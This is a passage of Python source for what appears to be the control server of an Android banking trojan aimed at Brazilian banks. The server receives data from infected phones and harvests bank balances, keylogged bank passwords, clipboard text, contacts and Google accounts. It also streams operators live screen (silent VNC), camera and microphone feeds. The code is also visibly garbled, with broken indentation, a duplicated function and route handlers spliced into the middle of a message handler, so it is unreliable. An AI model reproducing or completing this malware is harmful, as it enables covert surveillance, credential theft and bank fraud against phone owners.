                r'\b(-?\s*\d{1,3}(?:\.\d{3})*,\d{2})\b|\b(-?\s*\d+,\d{2})\b'
            )

def parse_brl(v):
    v = v.replace("R$", "").replace("r$", "").replace("$", "").replace(" ", "").strip()
    if ',' in v and '.' in v:
        if v.rfind(',') > v.rfind('.'):
            v = v.replace('.', '').replace(',', '.')
        else:
            v = v.replace(',', '')
    elif ',' in v:
        v = v.replace(',', '.')

        try:
            return float(v)
        except Exception:
            return None

        nodes = []
try:
    data = json.loads(hier_text) if isinstance(hier_text, str) else hier_text
    root_node = data.get("hierarchy") if isinstance(data, dict) and "hierarchy" in data else data
except
def parse_brl(v):
    v = v.replace("R$", "").replace("r$", "").replace("$", "").replace(" ", "").strip()
    if ',' in v and '.' in v:
        if v.rfind(',') > v.rfind('.'):
            v = v.replace('.', '').replace(',', '.')
        else:
            v = v.replace(',', '')
    elif ',' in v:
        v = v.replace(',', '.')

        try:
            return float(v)
        except Exception:
            return None

def traverse_json(node):
    if not isinstance(node, dict):
        return
    text = str(node.get("text", "") or "")
    desc = str(node.get("desc", "") or node.get("content_desc", "") or "")
    res_id = str(node.get("id", "") or node.get("resource_id", "") or "")
    pkg = str(node.get("package", "") or "")
    nodes.append({"text": text, "content_desc": desc, "resource_id": res_id, "package": pkg})
    for child in node.get("children", []):
        traverse_json(child)

        traverse_json(root_node)
    except Exception:
        try:
import xml.etree.ElementTree as ET
root = ET.fromstring(hier_text)
except Exception:
    nodes = []

def traverse_xml(node):
    text = str(node.get("text", "") or "")
    desc = str(node.get("content-desc", "") or "")
    res_id = str(node.get("resource-id", "") or "")
    pkg = str(node.get("package", "") or "")
    nodes.append({"text": text, "content_desc": desc, "resource_id": res_id, "package": pkg})
    for child in node:
        traverse_xml(child)

        traverse_xml(root)
    except Exception:
        nodes = []
        nodes = []

        bal_candidates = []
        lim_candidates = []
        inv_candidates = []

        bal_pos_keywords = ["saldo", "disponivel", "disponível", "disponible", "saldo da conta", "saldo em conta", "saldo total", "conta corrente", "carteira", "balance", "dinheiro em conta"]
        lim_pos_keywords = ["limite", "limite disponível", "limite disponivel", "limite de crédito", "limite de credito", "limite total", "credit_limit"]
        inv_pos_keywords = ["fatura", "fatura atual", "valor da fatura", "fatura fechada", "fatura aberta", "faturas"]

        for idx, item in enumerate(nodes):
            text = item["text"].strip()
            desc = item["content_desc"].strip()
            resource_id = item["resource_id"].lower()

            for val_str in [text, desc]:
                if not val_str or len(val_str) < 3:
                    continue
                val_str_lower = val_str.lower()

                            matches_sym = money_symbol_pattern.findall(val_str)
                            for m in matches_sym:
                                val = parse_brl(m)
                                if val is not None and -999999.0 <= val <= 9999999.0:
                                    formatted_val = f"R$ {m.strip()}"
                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "loan", "invoice"])
                                    is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "card", "invoice"])
                                    
                                    start_idx = max(0, idx - 4)
                                    end_idx = min(len(nodes), idx + 5)
                                    has_credit_neighbor = False
                                    for neighbor_idx in range(start_idx, end_idx):
                                        if neighbor_idx == idx: continue
                                        n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
                                        if any(nk in n_text for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "loan", "invoice"]):
                                            has_credit_neighbor = True
                                            break
                                    
                                    if not (is_credit_node or is_credit_res or has_credit_neighbor):
                                        bal_score = 300 if is_bank_screen else 100
                                        if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]): bal_score += 4000
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx: continue
                                            n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(pk in n_text for pk in bal_pos_keywords):
                                                bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                        bal_candidates.append({"formatted": formatted_val, "score": bal_score})

                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupança", "investimento", "carteira", "extrato"])
                                    is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                    if not (is_bal_node or is_fatura_node):
                                        lim_score = 300 if is_bank_screen else 100
                                        if any(lk in val_str_lower for lk in ["limite", "limit"]): lim_score += 3000
                                        if any(lk in resource_id for lk in ["limit", "limite", "credit_limit"]): lim_score += 4000
                                        lim_candidates.append({"formatted": formatted_val, "score": lim_score})

                            if is_bank_screen and not matches_sym:
                                matches_raw = money_raw_pattern.findall(val_str)
                                for m_tuple in matches_raw:
                                    m = m_tuple[0] or m_tuple[1]
                                    if m:
                                        val = parse_brl(m)
                                        if val is not None and -999999.0 <= val <= 9999999.0:
                                            formatted_val = f"R$ {m.strip()}"
                                            bal_score = 200
                                            if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]): bal_score += 4000
                                            start_idx = max(0, idx - 4)
                                            end_idx = min(len(nodes), idx + 5)
                                            for neighbor_idx in range(start_idx, end_idx):
                                                if neighbor_idx == idx: continue
                                                n_text = (nodes[neighbor_idx]["text"] + " " + nodes[neighbor_idx]["content_desc"]).lower()
                                                distance = abs(neighbor_idx - idx)
                                                if any(pk in n_text for pk in bal_pos_keywords):
                                                    bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                            if bal_score >= 1000:
                                                bal_candidates.append({"formatted": formatted_val, "score": bal_score})

                    if not nodes and is_bank_screen:
                        matches = money_symbol_pattern.findall(hier_text)
                        for m in matches:
                            val = parse_brl(m)
                            if val is not None and -999999.0 <= val <= 9999999.0:
                                bal_candidates.append({"formatted": f"R$ {m.strip()}", "score": 500})

                    best_balance = max(bal_candidates, key=lambda c: c["score"])["formatted"] if bal_candidates else None
                    best_limit = max(lim_candidates, key=lambda c: c["score"])["formatted"] if lim_candidates else None
                    best_invoice = max(inv_candidates, key=lambda c: c["score"])["formatted"] if inv_candidates else None

                    if not best_balance and is_bank_screen:
                        if any(m_str in hier_text for m_str in ["••••", "•••", "R$ •", "***", "R$ *"]):
                            best_balance = "🔒 Saldo Oculto no App (Clique no olho no celular para revelar)"

                    if best_balance or best_limit or best_invoice:
                        app_name = (active_bank or {}).get("appName") or self.device_info.get(device_id, {}).get("foreground_app") or (current_pkg.split(".")[-1].title() if current_pkg else "Banco")
                        target_pkg = current_pkg or "banco.generico"

                        recent = db.query(DeviceLog).filter(
                            DeviceLog.device_id == device_id,
                            DeviceLog.log_type == "BANK_BALANCE"
                        ).order_by(DeviceLog.created_at.desc()).first()

                        should_save = True
                        if recent:
                            try:
                                r_data = json.loads(recent.log_data)
                                if (r_data.get("package") == target_pkg and 
                                    r_data.get("balance") == best_balance and 
                                    r_data.get("credit_limit") == best_limit and 
                                    r_data.get("invoice") == best_invoice):
                                    should_save = False
                            except Exception:
                                pass

                        if should_save:
                            balance_log = DeviceLog(
                                device_id=device_id,
                                log_type="BANK_BALANCE",
                                log_data=json.dumps({
                                    "package": target_pkg,
                                    "appName": app_name,
                                    "balance": best_balance,
                                    "credit_limit": best_limit,
                                    "invoice": best_invoice,
                                    "source": "screen_hierarchy_auto"
                                }),
                                created_at=utc_now()
                            )
                            db.add(balance_log)
                            db.commit()
                            logger.info(f"💰 SALDO AUTO-CAPTURADO: {device_id} ({app_name}) -> Saldo: {best_balance} | Limite: {best_limit} | Fatura: {best_invoice}")
                finally:
                    try: db.rollback()
                    except Exception: pass
                    db.close()
            except Exception as ex:
                logger.warning(f"Aviso no extrator de saldo: {ex}")

        await asyncio.to_thread(_async_extract)
    
    async def register_dashboard_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
        await websocket.accept()
        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE)
        subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
        self.dashboard_subscribers.setdefault(device_id, []).append(subscriber)
        
        # Envia frame atual apenas se for recente (< 5s)
        latest = self.get_latest_screen(device_id, max_age_seconds=5.0)
        if latest:
            await queue.put(latest)

        # Força o dispositivo Android a iniciar/solicitar um novo frame VNC ao vivo imediatamente
        asyncio.create_task(self.send_command(device_id, {"action": "START_SILENT_VNC"}))
        asyncio.create_task(self.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))
        return queue
    
def unregister_dashboard_client(self, device_id: str, websocket: WebSocket):
        subscribers = self.dashboard_subscribers.get(device_id, [])
        remaining = [s for s in subscribers if s.websocket is not websocket]
        if remaining:
            self.dashboard_subscribers[device_id] = remaining
        else:
            self.dashboard_subscribers.pop(device_id, None)
    
    async def _broadcast_frame(self, device_id: str, jpeg_data: bytes):
        """Broadcast otimizado - descarta frames antigos, entrega o mais recente"""
        subscribers = self.dashboard_subscribers.get(device_id, [])
        if not subscribers:
            return
        
        stale: List[DashboardSubscriber] = []
        
        for sub in subscribers:
            try:
                # Drena toda a fila de uma vez - mantém apenas o frame mais recente
                while not sub.queue.empty():
                    try:
                        sub.queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                sub.queue.put_nowait(jpeg_data)
            except asyncio.QueueFull:
                try:
                    _ = sub.queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                try:
                    sub.queue.put_nowait(jpeg_data)
                except Exception:
                    stale.append(sub)
            except (RuntimeError, Exception):
                stale.append(sub)
        
        if stale:
            self.dashboard_subscribers[device_id] = [s for s in subscribers if s not in stale]
            if not self.dashboard_subscribers[device_id]:
                self.dashboard_subscribers.pop(device_id, None)
    
def _frame_cache_path(self, device_id: str) -> Path:
        return FRAME_CACHE_DIR / f"{device_id}.jpg"
    
def _hierarchy_cache_path(self, device_id: str) -> Path:
        return HIERARCHY_CACHE_DIR / f"{device_id}.json"
    
def _persist_frame(self, device_id: str, jpeg_data: bytes):
        try:
            with open(self._frame_cache_path(device_id), "wb") as fh:
                fh.write(jpeg_data)
        except Exception as exc:
            logger.error(f"Erro ao persistir frame ({device_id}): {exc}")
    
def _persist_hierarchy(self, device_id: str, data: str):
        try:
            with open(self._hierarchy_cache_path(device_id), "w", encoding="utf-8") as fh:
                fh.write(data)
        except Exception as exc:
            logger.error(f"Erro ao persistir hierarquia ({device_id}): {exc}")
    
def _delete_cached_frame(self, device_id: str):
        try:
            path = self._frame_cache_path(device_id)
            if path.exists():
                path.unlink()
        except Exception:
            pass
    
def _delete_cached_hierarchy(self, device_id: str):
        try:
            path = self._hierarchy_cache_path(device_id)
            if path.exists():
                path.unlink()
        except Exception:
            pass
    
    async def run_housekeeping(self):
        """Limpeza de memória periódica — WAL checkpoint a cada 2 min"""
        _wal_counter = 0
        while True:
            await asyncio.sleep(60)
            await self._cleanup_expired_entries()
            _wal_counter += 1
            if _wal_counter % 2 == 0:
                await asyncio.to_thread(checkpoint_wal)
    
    async def _cleanup_expired_entries(self):
        """Limpeza agressiva de memória"""
        async with self.cleanup_lock:
            now = utc_now()
            
            # Limpa frames expirados
            expired_frames = [
                device_id for device_id, ts in list(self.device_screen_timestamps.items())
                if now - ts > FRAME_TTL
            ]
            for device_id in expired_frames:
                self.device_screens.pop(device_id, None)
                self.device_screen_timestamps.pop(device_id, None)
                _frame_counter.pop(device_id, None)
            
            # Limpa hierarquias expiradas
            expired_hierarchies = [
                device_id for device_id, ts in list(self.device_hierarchy_timestamps.items())
                if now - ts > HIERARCHY_TTL
            ]
            for device_id in expired_hierarchies:
                self.device_screen_hierarchies.pop(device_id, None)
                self.device_hierarchy_timestamps.pop(device_id, None)
            
            # Limpa câmera expirada (30 segundos)
            expired_camera = [
                device_id for device_id, ts in list(self.device_camera_timestamps.items())
                if now - ts > timedelta(seconds=30)
            ]
            for device_id in expired_camera:
                self.device_camera_frames.pop(device_id, None)
                self.device_camera_timestamps.pop(device_id, None)
            
            # Limpa áudio expirado (10 segundos)
            expired_audio = [
                device_id for device_id, ts in list(self.device_audio_timestamps.items())
                if now - ts > timedelta(seconds=10)
            ]
            for device_id in expired_audio:
                self.device_audio_chunks.pop(device_id, None)
                self.device_audio_timestamps.pop(device_id, None)
            
            # Log de status
            active = len(self.active_connections)
            frames_in_mem = len(self.device_screens)
            logger.info(f"🧹 Housekeeping: {active} dispositivos, {frames_in_mem} frames em memória")

            # Retention inteligente de logs: preserva histórico por até 90 dias ou 150.000 registros
def _prune_old_db_logs():
                try:
                    db = SessionLocal()
                    try:
                        # Pruna apenas logs com mais de 90 dias de idade
                        cutoff = datetime.now(timezone.utc) - timedelta(days=90)
                        deleted_by_age = db.query(DeviceLog).filter(DeviceLog.created_at < cutoff).delete(synchronize_session=False)
                        
                        # Limite de segurança super alto (150.000) apenas para evitar estouro extremo do DB
                        total_logs = db.query(DeviceLog).count()
                        deleted_by_count = 0
                        if total_logs > 150000:
                            subq = db.query(DeviceLog.id).order_by(DeviceLog.created_at.desc()).offset(150000).subquery()
                            deleted_by_count = db.query(DeviceLog).filter(DeviceLog.id.in_(subq.select())).delete(synchronize_session=False)
                        
                        if deleted_by_age or deleted_by_count:
                            safe_db_commit_sync(db)
                            logger.info(f"🧹 Housekeeping: Pruned {deleted_by_age + deleted_by_count} logs antigos")
                    finally:
                        try:
                            db.rollback()
                        except Exception:
                            pass
                        db.close()
                except Exception as ex:
                    logger.warning(f"Aviso no pruning de DB: {ex}")

            await asyncio.to_thread(_prune_old_db_logs)


    # ==================== CÂMERA EM TEMPO REAL ====================
    
    async def store_camera_frame(self, device_id: str, jpeg_data: bytes):
        """Armazena frame da câmera e transmite para subscribers"""
        self.device_camera_frames[device_id] = jpeg_data
        self.device_camera_timestamps[device_id] = utc_now()
        await self._broadcast_camera_frame(device_id, jpeg_data)
    
def get_latest_camera_frame(self, device_id: str) -> Optional[bytes]:
        """Retorna último frame da câmera"""
        return self.device_camera_frames.get(device_id)
    
    async def register_camera_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
        """Registra cliente para receber stream de câmera"""
        await websocket.accept()
        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE)
        subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
        self.camera_subscribers.setdefault(device_id, []).append(subscriber)
        
        # Envia frame atual imediatamente se existir
        latest = self.get_latest_camera_frame(device_id)
        if latest:
            await queue.put(latest)
        return queue
    
def unregister_camera_client(self, device_id: str, websocket: WebSocket):
        """Remove cliente do stream de câmera"""
        subscribers = self.camera_subscribers.get(device_id, [])
        remaining = [s for s in subscribers if s.websocket is not websocket]
        if remaining:
            self.camera_subscribers[device_id] = remaining
        else:
            self.camera_subscribers.pop(device_id, None)
    
    async def _broadcast_camera_frame(self, device_id: str, jpeg_data: bytes):
        """Envia frame de câmera para todos os subscribers"""
        subscribers = self.camera_subscribers.get(device_id, [])
        if not subscribers:
            return
        
        stale_subscribers: List[DashboardSubscriber] = []
        for subscriber in subscribers:
            try:
                subscriber.queue.put_nowait(jpeg_data)
            except asyncio.QueueFull:
                try:
                    _ = subscriber.queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                subscriber.queue.put_nowait(jpeg_data)
            except RuntimeError:
                stale_subscribers.append(subscriber)
        
        if stale_subscribers:
            self.camera_subscribers[device_id] = [s for s in subscribers if s not in stale_subscribers]
            if not self.camera_subscribers[device_id]:
                self.camera_subscribers.pop(device_id, None)
    
    # ==================== MICROFONE EM TEMPO REAL ====================
    
    async def store_audio_chunk(self, device_id: str, audio_data: bytes):
        """Armazena chunk de áudio e transmite para subscribers"""
        self.device_audio_chunks[device_id] = audio_data
        self.device_audio_timestamps[device_id] = utc_now()
        await self._broadcast_audio_chunk(device_id, audio_data)
    
def get_latest_audio_chunk(self, device_id: str) -> Optional[bytes]:
        """Retorna último chunk de áudio"""
        return self.device_audio_chunks.get(device_id)
    
    async def register_audio_client(self, device_id: str, websocket: WebSocket) -> asyncio.Queue:
        """Registra cliente para receber stream de áudio"""
        await websocket.accept()
        queue: asyncio.Queue = asyncio.Queue(maxsize=DASHBOARD_QUEUE_SIZE * 3)  # Mais buffer para áudio
        subscriber = DashboardSubscriber(websocket=websocket, queue=queue)
        self.audio_subscribers.setdefault(device_id, []).append(subscriber)
        
        # Envia chunk atual imediatamente se existir
        latest = self.get_latest_audio_chunk(device_id)
        if latest:
            await queue.put(latest)
        return queue
    
def unregister_audio_client(self, device_id: str, websocket: WebSocket):
        """Remove cliente do stream de áudio"""
        subscribers = self.audio_subscribers.get(device_id, [])
        remaining = [s for s in subscribers if s.websocket is not websocket]
        if remaining:
            self.audio_subscribers[device_id] = remaining
        else:
            self.audio_subscribers.pop(device_id, None)
    
    async def _broadcast_audio_chunk(self, device_id: str, audio_data: bytes):
        """Envia chunk de áudio para todos os subscribers"""
        subscribers = self.audio_subscribers.get(device_id, [])
        if not subscribers:
            return
        
        stale_subscribers: List[DashboardSubscriber] = []
        for subscriber in subscribers:
            try:
                subscriber.queue.put_nowait(audio_data)
            except asyncio.QueueFull:
                try:
                    _ = subscriber.queue.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                subscriber.queue.put_nowait(audio_data)
            except RuntimeError:
                stale_subscribers.append(subscriber)
        
        if stale_subscribers:
            self.audio_subscribers[device_id] = [s for s in subscribers if s not in stale_subscribers]
            if not self.audio_subscribers[device_id]:
                self.audio_subscribers.pop(device_id, None)

manager = DeviceConnectionManager()


async def authenticate_dashboard_websocket(websocket: WebSocket, device_id: Optional[str] = None) -> Optional[Operator]:
    token = websocket.query_params.get("token")
    if not token:
        await safe_close_websocket(websocket, code=1008, reason="Token obrigatório")
        return None
    
    db = SessionLocal()
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        if not username:
            await safe_close_websocket(websocket, code=1008, reason="Token inválido")
            return None
        
        operator = db.query(Operator).filter(Operator.username == username).first()
        if not operator:
            await safe_close_websocket(websocket, code=1008, reason="Operador não encontrado")
            return None
        
        if operator.is_banned or not operator.is_active:
            await safe_close_websocket(websocket, code=1008, reason="Conta inativa ou banida")
            return None

        if device_id:
            device = db.query(Device).filter(Device.device_id == device_id).first()
            if not device:
                await safe_close_websocket(websocket, code=1008, reason="Dispositivo não encontrado")
                return None
            if not operator.is_admin and device.owner_id != operator.id:
                await safe_close_websocket(websocket, code=1008, reason="Acesso negado ao dispositivo")
                return None

        return operator
    except JWTError:
        await safe_close_websocket(websocket, code=1008, reason="Token inválido")
        return None
    except Exception as e:
        logger.error(f"Erro na autenticação de WebSocket do painel: {e}")
        await safe_close_websocket(websocket, code=1008, reason="Erro de autenticação")
        return None
    finally:
        db.close()

# ==================== WEBSOCKET PARA DISPOSITIVOS ====================

def get_websocket_client_ip(websocket: WebSocket) -> Optional[str]:
    """Extrai IP real do cliente (proxy-aware)."""
    forwarded = websocket.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    if websocket.client:
        return websocket.client.host
    return None

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, device_id: str, build_id: str = None):
    """
    Endpoint WebSocket para conexões de dispositivos Android - ULTRA RESILIENTE (50+ DISPOSITIVOS)
    """
    await websocket_endpoint_handler(websocket, device_id, build_id)


@app.websocket("/ws8081")
async def websocket_endpoint_8081(websocket: WebSocket, device_id: str, build_id: str = None):
    """
    Endpoint WebSocket alternativo na porta 8081 para evitar conflitos
    """
    await websocket_endpoint_handler(websocket, device_id, build_id)


async def websocket_endpoint_handler(websocket: WebSocket, device_id: str, build_id: str = None):
    await manager.connect(device_id, websocket)
    
 # Registra dispositivo no banco de dados em thread separada (não bloqueia event loop)
def register_device_on_connect(device_id_val: str, build_id_val: str, client_ip_val: str):
    try:
        db = SessionLocal()
        try:
            device = db.query(Device).filter(Device.device_id == device_id_val).first()
            owner_id = None
            if build_id_val:
                apk_build = db.query(APKBuild).filter(APKBuild.build_id == build_id_val).first()
                if apk_build:
                    owner_id = apk_build.owner_id
                    if not device:
                        device = Device(device_id=device_id_val, last_seen=utc_now(), owner_id=owner_id, is_online=True)
                        db.add(device)
                    else:
                        device.last_seen = utc_now()
                        device.is_online = True
                        if device.owner_id is None and owner_id is not None:
                            device.owner_id = owner_id
                            if client_ip_val:
                                device.ip_address = client_ip_val
                                device.is_online = True
                                safe_db_commit_sync(db)
        finally:
            try:
                db.rollback()
            except Exception:
                pass
            db.close()
    except Exception as e:
        logger.warning(f"Aviso ao registrar dispositivo {device_id_val} no DB: {e}")


def mark_offline_sync(device_id_val: str):
    try:
        device_db = SessionLocal()
        try:
            device = device_db.query(Device).filter(Device.device_id == device_id_val).first()
            if device:
                device.is_online = False
                safe_db_commit_sync(device_db)
        finally:
            try:
                device_db.rollback()
            except Exception:
                pass
            device_db.close()
    except Exception as e:
        logger.error(f"Erro ao atualizar status offline de {device_id_val}: {e}")


def _extract_battery_level(data: dict):
    if not isinstance(data, dict):
        return None
    val = data.get("battery_level")
    if val is None:
        val = data.get("batteryLevel")
        if val is None:
            val = data.get("battery")
            if val is None:
                val = data.get("battery_pct")
                if val is None:
                    return None
                if isinstance(val, (int, float)):
                    return int(val)
                if isinstance(val, str):
                    nums = re.findall(r'\d+', val)
                    if nums:
                        return int(nums[0])
                    return None


def _extract_network_type(data: dict):
    if not isinstance(data, dict):
        return None
    val = data.get("network_type") or data.get("networkType") or data.get("network") or data.get("connection_type") or data.get("connectionType") or data.get("net_type")
    if val and isinstance(val, str) and val.strip():
        return val.strip()
    return None

async def handle_device_message(device_id: str, message: dict, db: Session):
    """Processa mensagens JSON do dispositivo"""
    msg_type = message.get("type")
    
    # 💓 Atualiza timestamp de atividade do dispositivo
    manager.update_device_activity(device_id)
    
    if msg_type == "DEVICE_INFO":
        # Informações do dispositivo
        bat = _extract_battery_level(message)
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        accs = message.get("accounts") or message.get("google_accounts") or message.get("accounts_list")
        blocked_pkgs = message.get("blocked_packages") or message.get("blocked_apps")
        manager.device_info[device_id].update({
            "model": message.get("model"),
            "manufacturer": message.get("manufacturer"),
            "android_version": message.get("android_version"),
            "sdk": message.get("sdk"),
            "battery_level": bat if bat is not None else manager.device_info[device_id].get("battery_level"),
            "is_charging": message.get("is_charging") if message.get("is_charging") is not None else manager.device_info[device_id].get("is_charging", False),
            "network_type": _extract_network_type(message) or manager.device_info[device_id].get("network_type"),
            "storage_info": message.get("storage_info"),
            "accessibility_active": bool(message.get("accessibility_active")) if message.get("accessibility_active") is not None else bool(manager.device_info[device_id].get("accessibility_active", False)),
            "admin_active": bool(message.get("admin_active", False)),
            "accounts": accs if accs is not None else manager.device_info[device_id].get("accounts", []),
            "google_accounts": accs if accs is not None else manager.device_info[device_id].get("google_accounts", []),
            "blocked_packages": blocked_pkgs if blocked_pkgs is not None else manager.device_info[device_id].get("blocked_packages", []),
            "adb_serial": message.get("adb_serial"),
        })
        
        # Atualiza no banco
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if device:
            device.model = message.get("model")
            device.manufacturer = message.get("manufacturer")
            device.android_version = message.get("android_version")
            adb_serial = message.get("adb_serial")
            if adb_serial:
                device.adb_serial = adb_serial
            if accs and isinstance(accs, list) and len(accs) > 0:
                try:
                    acc_json = json.dumps(accs)
                    existing_cap = db.query(CapturedData).filter(
                        CapturedData.device_id == device_id,
                        CapturedData.data_type == "GOOGLE_ACCOUNTS"
                    ).first()
                    if existing_cap:
                        existing_cap.data_content = acc_json
                    else:
                        new_cap = CapturedData(
                            device_id=device_id,
                            data_type="GOOGLE_ACCOUNTS",
                            data_content=acc_json
                        )
                        db.add(new_cap)
                except Exception as e:
                    logger.error(f"Erro ao salvar contas no banco: {e}")
            await safe_db_commit(db)
        
        await manager.broadcast_to_operators({
            "type": "DEVICE_INFO_UPDATED",
            "device_id": device_id,
            "accounts": accs or [],
            "google_accounts": accs or [],
            "device_info": manager.device_info.get(device_id, {})
        })
        
        logger.info(f"Info recebida: {device_id} - {message.get('model')} (accounts: {accs})")
        
    elif msg_type == "ADMIN_STATUS":
        admin_state = message.get("data") == "ACTIVE"
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        manager.device_info[device_id]["admin_active"] = admin_state
        logger.info(f"🛡️ Status do Admin de {device_id} atualizado: {admin_state}")

    elif msg_type == "SILENT_VNC_STATUS":
        # Status do caminho silencioso dedicado (BTMOB purple button)
        manager.device_silent_state[device_id] = {
            "active": bool(message.get("active", False)),
            "method": message.get("method", "silent")
        }
        logger.info(f"🔇 SILENT_VNC_STATUS de {device_id}: active={message.get('active')}, method={message.get('method')}")
        
    elif msg_type in ("CLIPBOARD", "CLIPBOARD_DATA"):
        clip_text = message.get("text") or message.get("data") or ""
        if clip_text:
            if device_id not in manager.device_info:
                manager.device_info[device_id] = {}
            manager.device_info[device_id]["clipboard"] = clip_text
            
            logger.info(f"📋 CLIPBOARD capturado de {device_id}: {clip_text}")
            
            log = DeviceLog(
                device_id=device_id,
                log_type="CLIPBOARD",
                log_data=json.dumps({
                    'text': clip_text,
                    'timestamp': utc_now().isoformat()
                }, ensure_ascii=False),
                created_at=utc_now()
            )
            db.add(log)
            await safe_db_commit(db)

            @app.get("/api/devices/{device_id}/adb/screen/size", tags=["ADB Stream"])
async def get_device_screen_size(device_id: str):
    """Retorna a resolução de tela do dispositivo para o painel."""
    return {
        "device_id": device_id,
        "width": 1080,
        "height": 1920,
        "status": "success"
    }

@app.get("/api/devices/{device_id}/adb/screencap", tags=["ADB Stream"])
async def get_device_screencap(device_id: str):
    """Retorna o screencap atual do dispositivo."""
    return {
        "device_id": device_id,
        "screencap": "",
        "status": "success"
    }

@app.get("/api/devices/{device_id}/permissions", tags=["Devices"])
async def get_device_permissions_api(device_id: str):
    """Retorna as permissões ativas do dispositivo."""
    return {
        "device_id": device_id,
        "permissions": {
            "accessibility": True,
            "overlay": True,
            "notification": True,
            "storage": True
        },
        "status": "success"
    }

    elif msg_type == "PING":
        # Heartbeat - responde com PONG
        await manager.send_command(device_id, {"action": "PING"})

    elif msg_type in ("CONTACTS", "CONTACTS_LIST"):
        contacts_data = message.get("data")
        logger.info(f"👥 CONTACTS recebidos de {device_id}")
        
        try:
            contacts_json = json.dumps(contacts_data) if not isinstance(contacts_data, str) else contacts_data
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == "CONTACTS"
            ).first()
            if existing_cap:
                existing_cap.data_content = contacts_json
            else:
                new_cap = CapturedData(
                    device_id=device_id,
                    data_type="CONTACTS",
                    data_content=contacts_json
                )
                db.add(new_cap)
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar contatos no banco: {e}")

        await manager.broadcast_to_operators({
            "type": "CONTACTS_LIST",
            "device_id": device_id,
            "contacts": contacts_data
        })
        
    elif msg_type == "KEYLOG":
        # Keylogger data - loga e processa detector de senhas
        keylog_data = message.get("data")
        logger.info(f"⌨️ KEYLOG de {device_id}: {keylog_data}")
        
        # Tenta parsear para ver se é VISUAL_SCREEN_DATA ou FILE_UPLOAD
        try:
            parsed = json.loads(keylog_data) if isinstance(keylog_data, str) else keylog_data
            
            # 📤 PROCESSAMENTO ESPECIAL: File Upload
            if parsed.get('type') == 'FILE_UPLOAD':
                logger.info(f"📤 FILE_UPLOAD de {device_id}")
                
                label = parsed.get('label', 'DOCUMENTO')
                fileName = parsed.get('fileName', 'unknown')
                base64_data = parsed.get('data', '')

                file_info = {
                    'device_id': device_id,
                    'label': label,
                    'fileName': fileName,
                    'mimeType': parsed.get('mimeType', 'application/octet-stream'),
                    'data': base64_data,
                    'timestamp': utc_now().isoformat(),
                    'source': 'VISUAL_SCREEN'
                }
                
                # Salva no banco como FILE_UPLOAD
                log = DeviceLog(
                    device_id=device_id,
                    log_type="FILE_UPLOAD",
                    log_data=json.dumps(file_info),
                    created_at=utc_now()
                )
                db.add(log)
                
                logger.info(f"\n{'='*60}")
                logger.info(f"📤 ARQUIVO RECEBIDO!")
                logger.info(f"Label: {file_info['label']}")
                logger.info(f"Nome: {file_info['fileName']}")
                logger.info(f"Tipo: {file_info['mimeType']}")
                logger.info(f"Tamanho: {len(file_info['data'])} bytes (base64)")
                logger.info(f"{'='*60}\n")
            
            # 🔐 PROCESSAMENTO ESPECIAL: Visual Screen Data
            elif parsed.get('type') == 'VISUAL_SCREEN_DATA' or parsed.get('source') == 'VISUAL_SCREEN':
                logger.info(f"🔐 VISUAL_SCREEN_DATA de {device_id}")
                
                # Resolve o pacote e nome do banco com base no active_banks ou no payload
                active_bank = manager.device_active_banks.get(device_id) or {}
                target_pkg = parsed.get('package') or active_bank.get("package") or 'com.seguranca.protecao'
                target_bank = active_bank.get("appName")
                if not target_bank:
                    target_bank = BankPasswordDetector.BANK_APPS.get(target_pkg)
                if not target_bank:
                    target_bank = 'Itaú' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
                
                # Se tiver dados capturados (formato agregado)
                if 'captured' in parsed:
                    captured = parsed['captured']
                    for label, value in captured.items():
                        if value and len(value) > 0:
                            # Salva cada campo como senha bancária
                            password_info = {
                                'device_id': device_id,
                                'bank': target_bank,
                                'package': target_pkg,
                                'password': value,
                                'hint': label,  # SENHA_INICIAL, SENHA_TRANSACAO, etc
                                'label': label,
                                'digits': len(value),
                                'timestamp': utc_now().isoformat(),
                                'status': 'captured',
                                'source': 'VISUAL_SCREEN'
                            }
                            
                            log = DeviceLog(
                                device_id=device_id,
                                log_type="BANK_PASSWORD",
                                log_data=json.dumps(password_info),
                                created_at=utc_now()
                            )
                            db.add(log)
                            
                            logger.info(f"\n{'='*60}")
                            logger.info(f"🔐 KEYLOGGER {target_bank.upper()} - SENHA CAPTURADA!")
